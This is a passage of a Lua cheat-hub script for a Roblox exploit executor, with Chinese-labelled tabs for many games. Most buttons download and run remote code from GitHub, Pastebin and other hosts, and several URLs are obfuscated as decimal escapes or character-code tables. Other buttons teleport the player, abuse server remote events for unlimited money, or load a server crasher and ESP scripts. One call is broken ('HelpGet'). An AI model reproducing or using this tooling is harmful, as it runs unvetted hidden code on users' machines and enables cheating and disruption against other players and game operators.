loadstring(game:HttpGet(("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\65\81\84\70\69\72\54\84"),true))()
  end
})

local Tab = Window:MakeTab({
    Name = "俄亥俄州",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/DINERO9/TXXK-9988332231C/refs/heads/main/TXX-0099998877ACSSSCRIv2"))()
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\115\99\114\105\112\116\115\46\118\105\115\117\114\117\115\46\100\101\118\47\111\104\105\111\47\115\111\117\114\99\101"))()
  end
})

Tab:AddButton({
  Name = "3",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/rxn-xyz/Ohio./main/Ohio.lua",true))()
  end
})

Tab:AddButton({
  Name = "4",
  Callback = function()
  loadstring(game:HttpGet("https://pastebin.com/raw/hkvHeHed",true))()
  end
})

Tab:AddButton({
  Name = "鸭梨",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/rbxluau/Roblox/main/ScriptHub.lua"))()
  end
})

Tab:AddButton({
  Name = "TeTraX一拳超人",
  Callback = function()
  getgenv().TeTraXID = "TeTraXFREE"
loadstring(game:HttpGet("https://raw.githubusercontent.com/ZoinkyPoinkie/TeTraXOnTop/refs/heads/main/TeTra%20Source-obfuscated.lua"))()
  end
})

Tab:AddButton({
  Name = "云中心",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoYunCN/Cloud-script/main/%E6%B8%B8%E6%88%8F/%E4%BF%84%E4%BA%A5%E4%BF%84%E5%B7%9E.lua",true))()
  end
})

Tab:AddButton({
  Name = "FDP",
  Callback = function()
  loadstring(game:HttpGet(("https://raw.githubusercontent.com/Zephyr688/Lua-Script/refs/heads/main/FDP%E4%BF%84%E4%BA%A5%E4%BF%84%E5%B7%9E%E8%84%9A%E6%9C%AC%E6%BA%90%E7%A0%81.lua")))()
  end
})

local Section = Tab:AddSection({
	Name = "印钞机类"
})

Tab:AddButton({
  Name = "新版找印钞机 自动跳服务器",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/dingding123hhh/anlushanjinchangantangwanle/refs/heads/main/jmjmjmjmjmjmjmohio.txt"))()
  end
})

Tab:AddButton({
  Name = "找印钞机脚本 需要手动更换服务器",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/dingding123hhh/anlushanjinchangantangwanle/refs/heads/main/ohio.lua"))()
  end
})

Tab:AddButton({
  Name = "印钞机公益版",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/roblox-ye/QQ515966991/refs/heads/main/XIAOYE-OHIO.lua"))()
  end
})

Tab:AddButton({
  Name = "AL免费全自动捡印钞机",
  Callback = function()
  loadstring(game:HttpGet('https://raw.githubusercontent.com/xiao122231/Ohio/refs/heads/main/PrinterFinder.lua'))()
  end
})

local Section = Tab:AddSection({
	Name = "传送类"
})

Tab:AddButton({
	Name = "银行",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1055.94153, 15.11950874, -344.58374)
	end
})

Tab:AddButton({
	Name = "珠宝店",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1719.02637, 14.2831011, -714.293091)
	end
})

Tab:AddButton({
	Name = "沙滩",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(998.4656372070312, 15, 395.9789733886719)
	end
})

Tab:AddButton({
	Name = "武器店",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(660.5284423828125, 6.4081127643585205, -716.489990234375)
	end
})

Tab:AddButton({
	Name = "武士刀",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(175.191, 13.937, -132.69)
	end
})

Tab:AddButton({
	Name = "射线枪",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(148.685471, -90, -529.280945)
	end
})

Tab:AddButton({
	Name = "加特林",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(364.97076416015625, 0.764974117279053, -1447.3302001953125)
	end
})

Tab:AddButton({
	Name = "沙漠之鹰",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(363.341461, 26.0798492, -259.681396)
	end
})

Tab:AddButton({
	Name = "警察局",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(603.4676513671875,25.662811279296875,-922.0442504882812)
	end
})

Tab:AddButton({
	Name = "AUG",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1170.500244140625,48.37138366699219,-772.55859375)
	end
})

Tab:AddButton({
	Name = "军事基地",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(563.4422607421875,28.502071380615234,-1472.780517578125)
	end
})

local Tab = Window:MakeTab({
    Name = "死亡球",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/Ball1/main/Death"))()
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
  loadstring(game:HttpGet("https://github.com/Hosvile/InfiniX/releases/latest/download/main.lua",true))()
  end
})

local Tab = Window:MakeTab({
    Name = "3008",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet('https://raw.githubusercontent.com/Viserromero/Antex/master/SCP3008'))()
  end
})

local Tab = Window:MakeTab({
    Name = "军事大亨",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet"https://raw.githubusercontent.com/thedragonslayer2/Key-System/main/Load.lua")()
  end
})

local Tab = Window:MakeTab({
    Name = "战争大亨",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/ohiojjj/78/main/.github/workflows/Protected_5786868815098093.lua"))()
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
  loadstring(game:HttpGet'https://raw.githubusercontent.com/Macintosh1983/ChillHubMain/main/ChillHubOilWarfareTycoon.lua')()
  end
})

Tab:AddButton({
  Name = "3",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraIsMe/ToraIsMe/main/0wartycoon", true))()
  end
})

Tab:AddButton({
  Name = "4",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Cazzanos/The-basement/main/Basement%20hub", true))()
  end
})

Tab:AddButton({
  Name = "一直骑在别人身上",
  Callback = function()
  getgenv().farm = true
loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Margman/whynot/main/oil%20warfare%20tycoon%20autofarm"))()
  end
})

local Tab = Window:MakeTab({
    Name = "汽车经销大亨",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/03sAlt/BlueLockSeason2/main/README.md"))()
  end
})

Tab:AddButton({
  Name = "无限金币",
  Callback = function()
  Amount = 99999999

game.ReplicatedStorage.Remotes.SetSettings:FireServer("Money",Amount)
  end
})

local Tab = Window:MakeTab({
    Name = "DOORS&Rooms",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet(('https://pastebin.com/raw/R8QMbhzv')))()
  end
})

local Tab = Window:MakeTab({
        Name = "危险运输",
        Icon = "rbxassetid://7734068321",
        PremiumOnly = false
})

Tab:AddButton({
        Name = "1",
        Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/railme37509124/weqwdsadasdsa/refs/heads/main/justgetituploadedalreadyihateriskyhaul.lua"))()
          end
})


local Tab = Window:MakeTab({
        Name = "宠物故事",
        Icon = "rbxassetid://7734068321",
        PremiumOnly = false
})

Tab:AddButton({
        Name = "1",
        Callback = function()
        loadstring(game:HttpGet('https://pastebin.com/raw/wYAxD7n9'))()
          end
})


local Tab = Window:MakeTab({
        Name = "谋杀之谜",
        Icon = "rbxassetid://7734068321",
        PremiumOnly = false
})

Tab:AddButton({
        Name = "1",
        Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/FOGOTY/foggy-loader/refs/heads/main/loader"))()
          end
})


local Tab = Window:MakeTab({
        Name = "炸弹模拟器",
        Icon = "rbxassetid://7734068321",
        PremiumOnly = false
})

Tab:AddButton({
        Name = "1",
        Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Vexrya/Script/refs/heads/main/Games/BSX.lua"))()
          end
})


local Tab = Window:MakeTab({
        Name = "篮球传奇",
        Icon = "rbxassetid://7734068321",
        PremiumOnly = false
})

Tab:AddButton({
        Name = "1",
        Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/vnausea/absence-mini/refs/heads/main/absencemini.lua"))()
          end
})


local Tab = Window:MakeTab({
        Name = "冰刃球",
        Icon = "rbxassetid://7734068321",
        PremiumOnly = false
})

Tab:AddButton({
        Name = "1",
        Callback = function()
        loadstring(game:HttpGet("https://github.com/xiaoSB33/M416/raw/main/冰刃球.lua", true))()
          end
})


local Tab = Window:MakeTab({
        Name = "能量模拟器",
        Icon = "rbxassetid://7734068321",
        PremiumOnly = false
})

Tab:AddButton({
        Name = "自动收集",
        Callback = function()
        loadstring(game:HttpGet("https://github.com/xiaoSB33/M416/raw/main/p.lua", true))()
          end
})


local Tab = Window:MakeTab({
        Name = "健身房之星模拟器",
        Icon = "rbxassetid://7734068321",
        PremiumOnly = false
})

Tab:AddButton({
        Name = "1",
        Callback = function()
        loadstring(game:HttpGet("https://github.com/xiaoSB33/M416/raw/main/v.lua", true))()
          end
})


local Tab = Window:MakeTab({
        Name = "磁铁模拟器",
        Icon = "rbxassetid://7734068321",
        PremiumOnly = false
})

Tab:AddButton({
        Name = "自动收集硬币",
        Callback = function()
        loadstring(game:HttpGet("https://github.com/xiaoSB33/M416/raw/main/b.lua", true))()
          end
})

local Tab = Window:MakeTab({
    Name = "恐鬼症",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "GAI",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/wdwahDWGU/DWAHUBUHD/refs/heads/main/MSDUIWQQWD"))()
  end
})

Tab:AddButton({
  Name = "GAI(1.2.1版本)",
  Callback = function()
  loadstring(game:HttpGet("https://pastebin.com/raw/jmaK8Rpz"))()
  end
})

Tab:AddButton({
  Name = "By龙城",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/longchneg/GAl/refs/heads/main/Psychophobia"))()
  end
})

local Tab = Window:MakeTab({
    Name = "无名射手",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/R1nn1/MainMenu1/main/MainMenuV1.2"))()
  end
})

local Tab = Window:MakeTab({
    Name = "铲雪模拟器",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "自动收集雪",
  Callback = function()
        toggle = Value
    while toggle do wait()
    local args = {
        [1] = workspace:WaitForChild("HitParts"):WaitForChild("Snow1"),
        [2] = "Snow1",
        [3] = "MagicWand"
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("e8eGb8RgRXFcug8q"):FireServer(unpack(args))
        end
  end
})

Tab:AddButton({
  Name = "自动出售雪（要传送到指定地方）",
  Callback = function()
    toggle = Value
    while toggle do wait()
    local args = {
        [1] = "SellSnow",
        [2] = "Frosty"
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Modules"):WaitForChild("Network"):WaitForChild("RemoteEvent"):FireServer(unpack(args))
        end
  end
})

local Section = Tab:AddSection({
	Name = "传送类"
})

Tab:AddButton({
	Name = "传送出售雪的地方",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(481.4659423828125, 15.846257209777832, -66.55204010009766)
	end
})

Tab:AddButton({
	Name = "传送买车的地方",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(90.10160064697266, 16.051794052124023, -141.703125)
	end
})

Tab:AddButton({
	Name = "传送买工具的地方",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(131.7429962158203, 16.39700698852539, -12.935890197753906)
	end
})

Tab:AddButton({
	Name = "传送买背包的地方",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(348.6633605957031, 17.03822898864746, -16.793842315673828)
	end
})

Tab:AddButton({
	Name = "传送买假日礼物的地方",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(154.57424926757812, 16.215335845947266, 147.10423278808594)
	end
})

Tab:AddButton({
	Name = "传送买宠物的地方",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(138.49563598632812, 17.887277603149414, 278.3686218261719)
	end
})

Tab:AddButton({
	Name = "传送超大铲雪的地方",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-391.4309997558594, 15.84949016571045, 150.15187072753906)
	end
})

local Tab = Window:MakeTab({
    Name = "南极洲探险",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
	Name = "营地1",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-3675.547607421875, 228.99801635742188, 218.94447326660156)
	end
})

Tab:AddButton({
	Name = "汽车制造点",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2282.958251953125, 100.99801635742188, -62.833335876464844)
	end
})

Tab:AddButton({
	Name = "营地2",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1797.17822265625, 104.79232025146484, -123.54420471191406)
	end
})

Tab:AddButton({
	Name = "攀冰处",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(3197.6259765625, 848.4337158203125, -51.407386779785156)
	end
})

Tab:AddButton({
	Name = "营地3",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(5921.45703125, 320.99798583984375, -11.849882125854492)
	end
})

Tab:AddButton({
	Name = "营地4",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(8973.5390625, 596.2758178710938, 102.99405670166016)
	end
})

Tab:AddButton({
	Name = "南极点",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(10940.6982421875, 548.9979858398438, 16.84609031677246)
	end
})

local Tab = Window:MakeTab({
    Name = "攀登珠穆朗玛峰模拟器",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
	Name = "直接登顶",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-5183.84228515625, 8488.1103515625, 1100.88525390625)
	end
})

local Tab = Window:MakeTab({
    Name = "驾驶帝国",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet(('https://raw.githubusercontent.com/zeuise0002/SSSWWW222/main/README.md'),true))()
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Marco8642/science/main/drivingempire", true))()
  end
})

Tab:AddButton({
  Name = "3",
  Callback = function()
  loadstring(game:HttpGet("https://soggyhubv2.vercel.app"))()
  end
})

Tab:AddButton({
  Name = "NEO",
  Callback = function()
  loadstring(game:HttpGet(('https://raw.githubusercontent.com/cool83birdcarfly02six/Lightux/main/README.md'),true))()
  end
})

local Tab = Window:MakeTab({
    Name = "不可能的梯子障碍赛",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
	Name = "0",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(21.606796264648438, 7.249999523162842, -0.02189643308520317)
	end
})

Tab:AddButton({
	Name = "100",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(245.9777374267578, 108.5, -0.006160723511129618)
	end
})

Tab:AddButton({
	Name = "200",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(414.061767578125, 208.49998474121094, -0.6224109530448914)
	end
})

Tab:AddButton({
	Name = "300",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(583.8627319335938, 308.4999694824219, 0.9497064352035522)
	end
})

Tab:AddButton({
	Name = "400",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(748.9705810546875, 408.4999694824219, 0.9547381401062012)
	end
})

Tab:AddButton({
	Name = "500",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(917.850830078125, 508.4999694824219, 0.8259631395339966)
	end
})

Tab:AddButton({
	Name = "600",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1082.346923828125, 608.4999389648438, 1.1055326461791992)
	end
})

Tab:AddButton({
	Name = "700",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1252.5828857421875, 708.4999389648438, 0.18156661093235016)
	end
})

Tab:AddButton({
	Name = "800",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1419.887451171875, 808.4999389648438, 0.6651577949523926)
	end
})

Tab:AddButton({
	Name = "900",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1584.5516357421875, 908.4999389648438, 0.23482097685337067)
	end
})

Tab:AddButton({
	Name = "1000",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1747.585693359375, 1008.4999389648438, 0.4003906846046448)
	end
})

Tab:AddButton({
	Name = "1100",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2035.494873046875, 1108.4998779296875, 0.0002347309491597116)
	end
})

Tab:AddButton({
	Name = "1200",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2206.019287109375, 1208.4998779296875, 0.18762296438217163)
	end
})

Tab:AddButton({
	Name = "1300",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2367.7880859375, 1308.4998779296875, -0.04856015741825104)
	end
})

Tab:AddButton({
	Name = "1400",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2540.996826171875, 1408.4998779296875, 0.2795988917350769)
	end
})

Tab:AddButton({
	Name = "1500",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2703.693359375, 1508.4998779296875, 0.18184706568717957)
	end
})

Tab:AddButton({
	Name = "1600",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2870.104736328125, 1608.4998779296875, 0.4263322949409485)
	end
})

Tab:AddButton({
	Name = "1700",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(3039.073486328125, 1708.4998779296875, 0.6877847909927368)
	end
})

Tab:AddButton({
	Name = "1800",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(3206.9248046875, 1808.4998779296875, 0.2969937324523926)
	end
})

Tab:AddButton({
	Name = "1900",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(3373.03271484375, 1908.4998779296875, 0.864166259765625)
	end
})

Tab:AddButton({
	Name = "2000",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(3541.175048828125, 2008.4998779296875, -0.44642195105552673)
	end
})

local Tab = Window:MakeTab({
    Name = "格蕾丝",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1英文",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/Grace/refs/heads/main/Gra"))()
  end
})

Tab:AddButton({
  Name = "2英文",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/chiper1z/Grace/refs/heads/main/Protected_8122096522936905.txt"))()
  end
})

Tab:AddButton({
  Name = "3要卡密",
  Callback = function()
  loadstring(game:HttpGet("https://rawscripts.net/raw/Grace-Auto-Farm-And-More-23940"))()
  end
})

Tab:AddButton({
  Name = "XK（超好用）",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoXuAnZang/XKscript/refs/heads/main/GraceXJ.lua"))()
  end
})

local Section = Tab:AddSection({
	Name = "其他"
})

Tab:AddButton({
  Name = "破解所有成就（慎用）（没测试过）",
  Callback = function()
  loadstring(game:HttpGet("https://rawscripts.net/raw/Grace-get-all-badges-v2-25315"))()
  end
})

local Tab = Window:MakeTab({
	Name = "短信模拟器",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
   Name = "1",
   Callback = function()
   loadstring(game:HttpGet(('https://pastebin.com/raw/9hxkxUZ5'),true))() 
   end
})

local Tab = Window:MakeTab({
    Name = "法宝模拟器",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/FreeRobloxScripts/anime-fighting/main/simulator"))()
  end
})

Tab:AddButton({
   Name = "法宝模拟器2",
   Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/zhanghuihuihuil/Script/main/%E6%B3%95%E5%AE%9D%E6%A8%A1%E6%8B%9F%E5%99%A8%E6%B1%89%E5%8C%96'))()
   end
})

local Tab = Window:MakeTab({
    Name = "请捐赠",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "nufar hub",
  Callback = function()
  loadstring(game:HttpGet(('https://raw.githubusercontent.com/rbIxscriptsnet/unfair/main/rblxhub.lua'),true))()
  end
})

Tab:AddButton({
  Name = "szze hub",
  Callback = function()
  loadstring(game:HttpGet('https://raw.githubusercontent.com/CF-Trail/tzechco-PlsDonateAutofarmBackup/main/old.lua'))()
  end
})

Tab:AddButton({
  Name = "scow hub",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/scowscripts/scowsscripts/main/PLSCRY/Script",true))()
  end
})

local Tab = Window:MakeTab({
    Name = "厕所模拟器",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet('https://raw.githubusercontent.com/topitbopit/misc-scripts/main/public_bathroom_crasher.lua'))()
  end
})

local Tab = Window:MakeTab({
    Name = "背上只因剑",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraIsMe/ToraIsMe/main/0SwordWarriors"))()
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
  loadstring(game:HttpGet(('https://gist.githubusercontent.com/blox-hub-roblox/021bad62bbc6a0adc4ba4e625f9ad7df/raw/c89af6e1acf587d09e4ce4bc7510e7100e0c0065/swordWarrior.lua'),true))()
  end
})

Tab:AddButton({
  Name = "3",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/KidichiHB/Kidachi/main/Scripts/SwordWarrior", true))()
  end
})

local Tab = Window:MakeTab({
    Name = "地下城",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet("https://gist.githubusercontent.com/hngamingroblox/659adbebad6a9b3a07527e5f7e446d66/raw"))()
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
  loadstring(game:HttpGet("https://pastebin.com/raw/F5vSFHZt"))()
  end
})

local Tab = Window:MakeTab({
    Name = "动漫格斗",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Code-Fludex/Lua-Scripts/main/AnimeFightingSim.lua"))()
  end
})

Tab:AddButton({
  Name = "刷日元和水晶",
  Callback = function()
  local replicated = game:GetService("ReplicatedStorage")
local multiplier = 15
 
while true do task.wait()
    for i = 1, multiplier do
        task.spawn(function()
          replicated.RSPackage.Events.GeneralFunction:InvokeServer("LotteryRandomDraw")
          replicated.RSPackage.Events.GeneralEvent:FireServer("SpinFinished")
        end)
    end
end
  end
})

local Tab = Window:MakeTab({
    Name = "克隆大亨",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/HELLLO1073/RobloxStuff/main/CT-Destroyer"))()
  end
})

local Tab = Window:MakeTab({
    Name = "破坏者谜团",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Ihaveash0rtnamefordiscord/Releases/main/MurderMystery2HighlightESP"))(' Watermelon ?')
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
  loadstring(game:HttpGet(("https://raw.githubusercontent.com/Ethanoj1/EclipseMM2/master/Script"),true))()
  end
})

Tab:AddButton({
  Name = "透视凶手警长",
  Callback = function()
  loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()
  end
})

local Tab = Window:MakeTab({
	Name = "鱼Fishs",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/reddythedev/Reddy-Hub/main/_Loader'))()
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/bebedi15/SRM-Scripts/main/Bebedi9960/SRMHub"))()
  end
})

Tab:AddButton({
  Name = "3",
  Callback = function()
  loadstring(game:HelpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,115,104,122,46,97,108,47,126,70,105,115,104,83,99,114,105,112,116,78,101,119})end)())))()
  end
})

Tab:AddButton({
  Name = "4",
  Callback = function()
  loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,78,117,66,51,105,52,52,70})end)())))("鱼v1.7")
  end
})

Tab:AddButton({
  Name = "5",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
  end
})

Tab:AddButton({
  Name = "6",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/Fisch.lua"))()
  end
})

Tab:AddButton({
  Name = "7",
  Callback = function()
  loadstring(game:HttpGet("https://you.whimper.xyz/sources/CupPink/fisch.lua"))()
  end
})

Tab:AddButton({
  Name = "8",
  Callback = function()
  loadstring(game:HttpGet("https://pastefy.app/ptl5LG8c/raw"))()
  end
})

Tab:AddButton({
  Name = "乌托邦-鱼-中文",
  Callback = function()
  loadstring(game:HttpGet("https://pastefy.app/xXwLngQD/raw"))()
  end
})

Tab:AddButton({
  Name = "冷脚本",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/LENG8123/QQ2171633885/refs/heads/main/fisch.txt"))()
  end
})

Tab:AddButton({
  Name = "GODHUB(需要卡密)",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/kiciahook/kiciahook/refs/heads/main/loader.lua"))()
  end
})

local Section = Tab:AddSection({
	Name = "其他"
})

Tab:AddToggle({
  Name = "挂机钓鱼",  
  Default = false,
  Callback = function(value)
    autoFishingEnabled = value

        local config = {
            fpsCap = 9999,
            enableBigButton = true,        
            bigButtonScaleFactor = 0.7,     
            shakeSpeed = 0.01,           
            FreezeWhileFishing = true      
        }

        setfpscap(config.fpsCap)

        local players = game:GetService("Players")
        local vim = game:GetService("VirtualInputManager")
        local run_service = game:GetService("RunService")
        local replicated_storage = game:GetService("ReplicatedStorage")
        local localplayer = players.LocalPlayer
        local playergui = localplayer.PlayerGui

        local utility = {blacklisted_attachments = {"bob", "bodyweld"}}
        local fishingThread  

        function utility.simulate_click(x, y, mb)
            vim:SendMouseButtonEvent(x, y, (mb - 1), true, game, 1)
            vim:SendMouseButtonEvent(x, y, (mb - 1), false, game, 1)
        end

        function utility.move_fix(bobber)
            for _, value in bobber:GetDescendants() do
                if (value.ClassName == "Attachment" and table.find(utility.blacklisted_attachments, value.Name)) then
                    value:Destroy()
                end
            end
        end

        local farm = {reel_tick = nil, cast_tick = nil}

        function farm.find_rod()
            local character = localplayer.Character
